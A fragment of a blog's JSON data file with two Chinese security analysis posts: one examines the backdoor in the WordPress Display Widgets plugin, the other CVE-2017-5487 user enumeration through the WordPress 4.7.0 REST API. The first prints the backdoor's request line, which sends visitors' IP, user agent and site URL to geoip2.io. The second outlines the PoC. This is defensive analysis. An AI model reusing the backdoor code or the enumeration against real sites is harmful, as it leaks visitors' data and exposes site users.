]值用的，如下图，因为是本地测试，值是127.0.0.1\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/09/615866e907208464e0dd84ce681b9984.png)\n\n## <span id=\"i-14\" class=\"ez-toc-section\">声 明</span>\n\n本安全公告仅用来描述可能存在的安全问题，绿盟科技不为此安全公告提供任何保证或承诺。由于传播、利用此安全公告所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，绿盟科技以及安全公告作者不为此承担任何责任。绿盟科技拥有对此安全公告的修改和解释权。如欲转载或传播此安全公告，必须保证此安全公告的完整性，包括版权声明等全部内容。未经绿盟科技允许，不得任意修改或者增减此安全公告内容，不得以任何方式将其用于商业目的。\n\n## <span id=\"i-15\" class=\"ez-toc-section\">关于绿盟科技</span>\n\n北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。\n\n基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。\n\n北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169\n直接询问：010-68438880\n\n&nbsp;","slug":"wordpress-display-widgets-backdoor-analysis","published":1,"updated":"2020-10-27T09:27:09.828Z","_id":"ckgrozua7005gwsa99xru6ubj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Display Widgets是WordPress一款插件，大约有200,000站点在使用该插件。最近，Display Widgets被发现存在有后门代码。该后门用于上传数据到第三方服务器，上传的数据包括用户IP地址，UA标识等。本文是对此后门的技术分析。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"后门分析\"><a href=\"#后门分析\" class=\"headerlink\" title=\"后门分析\"></a>后门分析</h2><p>Display Widgets安装后如下图</p>\n<p>** <img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/6f7efd8d362095b06add06300699d152.png\">**</p>\n<p>在没有安装Display Widgets插件，Widgets原来的样子</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/e2509aac2db597ea58b6aef3546c9d0c.png\"></p>\n<p>Display Widgets插件开启后的样子</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/40ef6b1571d2a66c88c48e2755e85553.png\"></p>\n<p>Display Widgets插件扩展了小工具的功能.</p>\n<p>虽然这个插件是在后台进行操作配置的，但是我们在浏览wordpress前端网页时，这个插件仍然可被加载.</p>\n<p>我们访问一下wordpress文章页面，并在后门处下断</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/1a0f108099c56002441f725d7804acb2.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/70a49c9b17f9418d5234db3e3aee3fab.png\"></p>\n<p>在后门文件上下断点，访问前端文章页面，被断下，证明此时后门已经加载了。</p>\n<p>下面我们分析下这个后门。</p>\n<p>这个后门文件名为geolocation.php，在插件安装后位于wp-content/plugins/display-widgets/文件夹中</p>\n<p>发现代码中有多处wp_remote_get()方法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/a100bea80b8b74c45ae65fb027a3007c.png\"></p>\n<p>这个方法是用来向外发送get请求的，如下图所示：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/9ab6c5489de13641cece3f0546cf1c21.png\"></p>\n<p>而且插件代码调用这个方法向外发送一个可疑的request_url参数，</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/53782c0d853c4929930720b1f985d95f.png\"></p>\n<p>$request_url = ‘<a href=\"http://geoip2.io/api/update/?url=&#39;\">http://geoip2.io/api/update/?url=&#39;</a> . <em>urlencode</em>( self::get_protocol() . $<em>SERVER[ ‘HTTP_HOST’ ] . $_SERVER[ ‘REQUEST_URI’ ] ) . ‘&amp;agent=’ . _urlencode</em>( self::get_user_agent() ) . ‘&amp;geo=true&amp;p=9&amp;v=0&amp;ip=’ . <em>urlencode</em>( $<em>SERVER[ ‘REMOTE_ADDR’ ] ) . ‘&amp;siteurl=’ . _urlencode</em>( get_site_url() );</p>\n<p>因此这处怀疑是一处后门。</p>\n<p>我们分析下这个request_url参数都向外发送了什么，下面具体分析下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/50af7f673213b16417f0aa6290d2ec02.png\"></p>\n<p>request_url这个参数拼接了一个地址，并向这个地址通过get主要提交了url参数、agent参数和siteurl参数。</p>\n<p>我们看一下这三个参数中泄露了什么信息</p>\n<p><strong>先看url**</strong>参数中：**</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/f22cb75bb40b49ed3ee4ab06f71c4e4b.png\"></p>\n<p>参数中的第一处调用了get_protocol()方法，，我们看下get_protocol方法，如下所示：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/0bc903e80ce4d5ee28a9757324f5c8fe.png\"></p>\n<p>这个方法是用来判断网址是否是https的</p>\n<p>然后紧接着拼接了一个$_SERVER[ ‘HTTP_HOST’ ] 和$_SERVER[ ‘REQUEST_URI’ ]组成了url参数</p>\n<p><strong>再看agent**</strong>参数中：**</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/87af809283644f1b9a86d5d0e17ee9f3.png\"></p>\n<p>包含了user_agent和$_SERVER[ ‘REMOTE_ADDR’ ]</p>\n<p>get_user_agent方法如下所示，这个方法返回了$_SERVER[ ‘HTTP_USER_AGENT’ ] 的值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/0c4c0b4eeea0b2faef852eead31568cb.png\"></p>\n<p><strong>最后看siteurl**</strong>参数中：**</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/1163b4162e19a41a6f663fbe050350bd.png\"></p>\n<p>包含了网站的地址。</p>\n<p>这些信息最终通过wp_remote_get方法被发送给了<a href=\"http://geoip2.io/\">http://geoip2.io</a>这个站，如下图所示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/bb3fe8542d80a2a0a86ba92d1b5b2a4d.png\"></p>\n<p>那代码中一共有多少处发送请求的地方呢？</p>\n<p>一共用三处，这三处发送的内容一样，就是上文所分析的内容。</p>\n<p>首先第一处在get_country方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/eddf14e841860555304ff5cadd78721c.png\"></p>\n<p>这个方法在display-widgets.php（插件主文件）中show_geolocation方法中被使用</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/c82dd71a1726ca6ffe3156832907b5fd.png\"></p>\n<p>第二处、第三次都在在check_query_string方法中，如下代码：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/4ff5ad5b8ebf19cc55149c3618abf715.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/344972d15831b3a29c45032474463074.png\"></p>\n<p>check_query_string方法在wp动作执行时被触发时被调用，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/1ab63e04e1bf5d775326d93c16401bf0.png\"></p>\n<p>而Wp动作意思是在wp项目被启动</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/69b8e0ee6fc49c154ba441dfd405fd8f.png\"></p>\n<p>另外，这个文件中还有个get_remote_ip方法，但是这个并没有被调用，</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/126a377ea229d9dba12e9980931ce2b0.png\"></p>\n<p>&nbsp;</p>\n<p>虽然没有被调用，但仍然可以看出这个方法是返回$_SERVER[ ‘REMOTE_ADDR’ ]值用的，如下图，因为是本地测试，值是127.0.0.1</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/615866e907208464e0dd84ce681b9984.png\"></p>\n<h2 id=\"声-明\"><a href=\"#声-明\" class=\"headerlink\" title=\"声 明\"></a><span id=\"i-14\" class=\"ez-toc-section\">声 明</span></h2><p>本安全公告仅用来描述可能存在的安全问题，绿盟科技不为此安全公告提供任何保证或承诺。由于传播、利用此安全公告所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，绿盟科技以及安全公告作者不为此承担任何责任。绿盟科技拥有对此安全公告的修改和解释权。如欲转载或传播此安全公告，必须保证此安全公告的完整性，包括版权声明等全部内容。未经绿盟科技允许，不得任意修改或者增减此安全公告内容，不得以任何方式将其用于商业目的。</p>\n<h2 id=\"关于绿盟科技\"><a href=\"#关于绿盟科技\" class=\"headerlink\" title=\"关于绿盟科技\"></a><span id=\"i-15\" class=\"ez-toc-section\">关于绿盟科技</span></h2><p>北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。</p>\n<p>基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。</p>\n<p>北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169<br>直接询问：010-68438880</p>\n<p>&nbsp;</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/勒索软件Ransomware防御领域.jpg","excerpt":"<p>Display Widgets是WordPress一款插件，大约有200,000站点在使用该插件。最近，Display Widgets被发现存在有后门代码。该后门用于上传数据到第三方服务器，上传的数据包括用户IP地址，UA标识等。本文是对此后门的技术分析。</p>","more":"<h2 id=\"后门分析\"><a href=\"#后门分析\" class=\"headerlink\" title=\"后门分析\"></a>后门分析</h2><p>Display Widgets安装后如下图</p>\n<p>** <img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/6f7efd8d362095b06add06300699d152.png\">**</p>\n<p>在没有安装Display Widgets插件，Widgets原来的样子</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/e2509aac2db597ea58b6aef3546c9d0c.png\"></p>\n<p>Display Widgets插件开启后的样子</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/40ef6b1571d2a66c88c48e2755e85553.png\"></p>\n<p>Display Widgets插件扩展了小工具的功能.</p>\n<p>虽然这个插件是在后台进行操作配置的，但是我们在浏览wordpress前端网页时，这个插件仍然可被加载.</p>\n<p>我们访问一下wordpress文章页面，并在后门处下断</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/1a0f108099c56002441f725d7804acb2.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/70a49c9b17f9418d5234db3e3aee3fab.png\"></p>\n<p>在后门文件上下断点，访问前端文章页面，被断下，证明此时后门已经加载了。</p>\n<p>下面我们分析下这个后门。</p>\n<p>这个后门文件名为geolocation.php，在插件安装后位于wp-content/plugins/display-widgets/文件夹中</p>\n<p>发现代码中有多处wp_remote_get()方法：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/a100bea80b8b74c45ae65fb027a3007c.png\"></p>\n<p>这个方法是用来向外发送get请求的，如下图所示：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/9ab6c5489de13641cece3f0546cf1c21.png\"></p>\n<p>而且插件代码调用这个方法向外发送一个可疑的request_url参数，</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/53782c0d853c4929930720b1f985d95f.png\"></p>\n<p>$request_url = ‘<a href=\"http://geoip2.io/api/update/?url=&#39;\">http://geoip2.io/api/update/?url=&#39;</a> . <em>urlencode</em>( self::get_protocol() . $<em>SERVER[ ‘HTTP_HOST’ ] . $_SERVER[ ‘REQUEST_URI’ ] ) . ‘&amp;agent=’ . _urlencode</em>( self::get_user_agent() ) . ‘&amp;geo=true&amp;p=9&amp;v=0&amp;ip=’ . <em>urlencode</em>( $<em>SERVER[ ‘REMOTE_ADDR’ ] ) . ‘&amp;siteurl=’ . _urlencode</em>( get_site_url() );</p>\n<p>因此这处怀疑是一处后门。</p>\n<p>我们分析下这个request_url参数都向外发送了什么，下面具体分析下：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/50af7f673213b16417f0aa6290d2ec02.png\"></p>\n<p>request_url这个参数拼接了一个地址，并向这个地址通过get主要提交了url参数、agent参数和siteurl参数。</p>\n<p>我们看一下这三个参数中泄露了什么信息</p>\n<p><strong>先看url**</strong>参数中：**</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/f22cb75bb40b49ed3ee4ab06f71c4e4b.png\"></p>\n<p>参数中的第一处调用了get_protocol()方法，，我们看下get_protocol方法，如下所示：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/0bc903e80ce4d5ee28a9757324f5c8fe.png\"></p>\n<p>这个方法是用来判断网址是否是https的</p>\n<p>然后紧接着拼接了一个$_SERVER[ ‘HTTP_HOST’ ] 和$_SERVER[ ‘REQUEST_URI’ ]组成了url参数</p>\n<p><strong>再看agent**</strong>参数中：**</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/87af809283644f1b9a86d5d0e17ee9f3.png\"></p>\n<p>包含了user_agent和$_SERVER[ ‘REMOTE_ADDR’ ]</p>\n<p>get_user_agent方法如下所示，这个方法返回了$_SERVER[ ‘HTTP_USER_AGENT’ ] 的值</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/0c4c0b4eeea0b2faef852eead31568cb.png\"></p>\n<p><strong>最后看siteurl**</strong>参数中：**</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/1163b4162e19a41a6f663fbe050350bd.png\"></p>\n<p>包含了网站的地址。</p>\n<p>这些信息最终通过wp_remote_get方法被发送给了<a href=\"http://geoip2.io/\">http://geoip2.io</a>这个站，如下图所示</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/bb3fe8542d80a2a0a86ba92d1b5b2a4d.png\"></p>\n<p>那代码中一共有多少处发送请求的地方呢？</p>\n<p>一共用三处，这三处发送的内容一样，就是上文所分析的内容。</p>\n<p>首先第一处在get_country方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/eddf14e841860555304ff5cadd78721c.png\"></p>\n<p>这个方法在display-widgets.php（插件主文件）中show_geolocation方法中被使用</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/c82dd71a1726ca6ffe3156832907b5fd.png\"></p>\n<p>第二处、第三次都在在check_query_string方法中，如下代码：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/4ff5ad5b8ebf19cc55149c3618abf715.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/344972d15831b3a29c45032474463074.png\"></p>\n<p>check_query_string方法在wp动作执行时被触发时被调用，如下图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/1ab63e04e1bf5d775326d93c16401bf0.png\"></p>\n<p>而Wp动作意思是在wp项目被启动</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/69b8e0ee6fc49c154ba441dfd405fd8f.png\"></p>\n<p>另外，这个文件中还有个get_remote_ip方法，但是这个并没有被调用，</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/126a377ea229d9dba12e9980931ce2b0.png\"></p>\n<p>&nbsp;</p>\n<p>虽然没有被调用，但仍然可以看出这个方法是返回$_SERVER[ ‘REMOTE_ADDR’ ]值用的，如下图，因为是本地测试，值是127.0.0.1</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/09/615866e907208464e0dd84ce681b9984.png\"></p>\n<h2 id=\"声-明\"><a href=\"#声-明\" class=\"headerlink\" title=\"声 明\"></a><span id=\"i-14\" class=\"ez-toc-section\">声 明</span></h2><p>本安全公告仅用来描述可能存在的安全问题，绿盟科技不为此安全公告提供任何保证或承诺。由于传播、利用此安全公告所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，绿盟科技以及安全公告作者不为此承担任何责任。绿盟科技拥有对此安全公告的修改和解释权。如欲转载或传播此安全公告，必须保证此安全公告的完整性，包括版权声明等全部内容。未经绿盟科技允许，不得任意修改或者增减此安全公告内容，不得以任何方式将其用于商业目的。</p>\n<h2 id=\"关于绿盟科技\"><a href=\"#关于绿盟科技\" class=\"headerlink\" title=\"关于绿盟科技\"></a><span id=\"i-15\" class=\"ez-toc-section\">关于绿盟科技</span></h2><p>北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。</p>\n<p>基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。</p>\n<p>北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169<br>直接询问：010-68438880</p>\n<p>&nbsp;</p>"},{"title":"Wordpress < 4.7.1用户名枚举漏洞分析(CVE-2017-5487)","date":"2017-09-03T07:14:05.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nWordPress是一种使用[PHP](http://blog.nsfocus.net/tag/php/)语言开发的博客平台，用户可以在支持[PHP](http://blog.nsfocus.net/tag/php/)和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。<!--more-->\n\nWordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限查看wordpress上所有发布过文章的用户信息列表。\n\n## 影响版本\n\nWordPress 4.7.0\n\n## 漏洞分析\n\n在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下:\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fbf1ee02736f1efd0aee8183b2c7872c.png)\n\n具体使用详情请参照REST API Handbook\n\n[https://developer.wordpress.org/rest-api/](https://developer.wordpress.org/rest-api/)，\n\n### 漏洞利用\n\n先从exploitdb上面提供的poc入手\n\nhttps://www.exploit-db.com/exploits/41497/\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fc442c07ec267747e57952b08896bc80.png)\n\nPOC看起来比较简单，就是调用了wordpress的rest api接口进行users查询，但是在笔者的环境中，需要对这个poc进行一点小改动，如下图，需要加上一个index.php，否则找不到目录。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fe547095c138ccaae959fa182cb61026.png)\n\n接下来看一下代码， 请求首先进入get_items_permissions_check模块进行权限检查\n\n<pre class=\"lang:default decode:true \">/**\n * Permissions check for getting all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return true|WP_Error True if the request has read access, otherwise WP_Error object.\n */\npublic function get_items_permissions_check( $request ) {\n   // Check if roles is specified in GET request and if user can list users.\n   if ( ! empty( $request['roles'] ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_user_cannot_view', __( 'Sorry, you are not allowed to filter users by role.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( 'edit' === $request['context'] &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_context', __( 'Sorry, you are not allowed to list users.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( in_array( $request['orderby'], array( 'email', 'registered_date' ), true ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_orderby', __( 'Sorry, you are not allowed to order users by this parameter.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return true;\n}\n</pre>\n\n看上面的注释可以大概了解这个函数的功能：当请求users参数时，用来检查请求是否有读的权限，否则爆出WP_Error错误。\n\n这个函数一共有三个if判断，这三个if判断都是由两部分组成的，每一个后半部分都是不可控的current_user_can( 'list_users' )，经测试，它的值还为false，所以只能使三个if得可控的前半部分不为真，才能最终绕过判定。\n\n我们var_dump下这三个$request值\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/e7da561195b2fa06e586fb23400b6666.png)\n\n有意思的事情发生了，我们什么事情也没做，竟然完美的避开了权限检查的三个判定，接下来进入下个环节get_items函数，检索所有的用户。\n\n<pre class=\"lang:default decode:true \">/**\n * Retrieves all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return WP_REST_Response|WP_Error Response object on success, or WP_Error object on failure.\n */\npublic function get_items( $request ) {\n。。。。。。。。。\n/**\n * Filters WP_User_Query arguments when querying users via the REST API.\n *\n * @link https://developer.wordpress.org/reference/classes/wp_user_query/\n *\n * @since 4.7.0\n *\n * @param array           $prepared_args Array of arguments for WP_User_Query.\n * @param WP_REST_Request $request       The current request.\n */\n$prepared_args = apply_filters( 'rest_user_query', $prepared_args, $request );\n\n$query = new WP_User_Query( $prepared_args );\n\n$users = array();\n\nforeach ( $query-&gt;results as $user ) {\n   $data = $this-&gt;prepare_item_for_response( $user, $request );\n   $users[] = $this-&gt;prepare_response_for_collection( $data );\n}\n\n$response = rest_ensure_response( $users );\n。。。。。。。。。。。\n</pre>\n\n上面代码省略了些内容，前半部分省略的是一些相关的参数配置，然后读到注释部分了解到下面参数经过过滤，就要进入WP_User_Query()部分了，我们通过给出的链接看一下查询部分的WP_User_Query()是怎么解释的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/9e8c928a2feb9cd56323f430459e4063.png)\n\n在跟进WP_User_Query中我们可以看到一个构造方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/8d5c805f0c49d37390e960741e07a7ef.png)\n\n在这里可以看到如果$query不为空，则先调用prepare_query(),接着再执行$this-&gt;query()\n\n我们看一下prepare_query()是做什么的。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fe7439ec2941f80fc6e94cffd89036b3.png)\n\n看注释可以了解到，它是准备查询变量的作用，可以看做是对变量的预处理。\n接下来往后看$this-&gt;query();。跟进query()函数看看它最终执行了什么。\n\n<pre class=\"lang:default decode:true \">/**\n * Execute the query, with the current variables.\n *\n * @since 3.1.0\n *\n * @global wpdb $wpdb WordPress database abstraction object.\n */\npublic function query() {\n   global $wpdb;\n\n   $qv =&amp; $this-&gt;query_vars;\n\n   $this-&gt;request = \"SELECT $this-&gt;query_fields $this-&gt;query_from $this-&gt;query_where $this-&gt;query_orderby $this-&gt;query_limit\";\n\n   if ( is_array( $qv['fields'] ) || 'all' == $qv['fields'] ) {\n      $this-&gt;results = $wpdb-&gt;get_results( $this-&gt;request );\n   } else {\n      $this-&gt;results = $wpdb-&gt;get_col( $this-&gt;request );\n   }\n</pre>\n\nquery()函数使用当前变量来执行查询，下面$this-&gt;request构造了一个sql查询语句，我们查看下它的值\n\n<pre class=\"lang:default decode:true \">SELECT SQL_CALC_FOUND_ROWS wp_users.* FROM wp_users WHERE 1=1 AND wp_users.ID IN ( SELECT DISTINCT wp_posts.post_author FROM wp_posts WHERE wp_posts.post_status = 'publish' AND wp_posts.post_type IN ( 'post', 'page', 'attachment' ) ) ORDER BY display_name ASC LIMIT 0, 10</pre>\n\n可以看出这里可以查询的wp_users信息是有约束条件的，这里可以查询的用户必须满足发表过‘publish’类型的文章，并且类型还要是‘post’、‘page’、‘attachment’中的一个\n\n我们分别看一下wp_users表和wp_posts表\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/4e1ac26138b89470e2c9f99061cb0663.png)\n\nwp_posts表\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/d19cbe6d4cccec7579e07aeb73f90dac.png)\n\nwp_users表\n\n最终通过api返回的用户信息\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/ff24e8f258f281b3b57e4863202ca9a0.png)\n\n## 修补防御\n\n升级wordpress至最新版本。\n","source":"_posts/wordpress-user-enumeration-vulnerability-analysis.md","raw":"---\ntitle: Wordpress < 4.7.1用户名枚举漏洞分析(CVE-2017-5487)\ndate: 2017-09-3 15:14:05\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nWordPress是一种使用[PHP](http://blog.nsfocus.net/tag/php/)语言开发的博客平台，用户可以在支持[PHP](http://blog.nsfocus.net/tag/php/)和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。<!--more-->\n\nWordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限查看wordpress上所有发布过文章的用户信息列表。\n\n## 影响版本\n\nWordPress 4.7.0\n\n## 漏洞分析\n\n在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下:\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fbf1ee02736f1efd0aee8183b2c7872c.png)\n\n具体使用详情请参照REST API Handbook\n\n[https://developer.wordpress.org/rest-api/](https://developer.wordpress.org/rest-api/)，\n\n### 漏洞利用\n\n先从exploitdb上面提供的poc入手\n\nhttps://www.exploit-db.com/exploits/41497/\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fc442c07ec267747e57952b08896bc80.png)\n\nPOC看起来比较简单，就是调用了wordpress的rest api接口进行users查询，但是在笔者的环境中，需要对这个poc进行一点小改动，如下图，需要加上一个index.php，否则找不到目录。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fe547095c138ccaae959fa182cb61026.png)\n\n接下来看一下代码， 请求首先进入get_items_permissions_check模块进行权限检查\n\n<pre class=\"lang:default decode:true \">/**\n * Permissions check for getting all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return true|WP_Error True if the request has read access, otherwise WP_Error object.\n */\npublic function get_items_permissions_check( $request ) {\n   // Check if roles is specified in GET request and if user can list users.\n   if ( ! empty( $request['roles'] ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_user_cannot_view', __( 'Sorry, you are not allowed to filter users by role.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( 'edit' === $request['context'] &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_context', __( 'Sorry, you are not allowed to list users.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( in_array( $request['orderby'], array( 'email', 'registered_date' ), true ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_orderby', __( 'Sorry, you are not allowed to order users by this parameter.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return 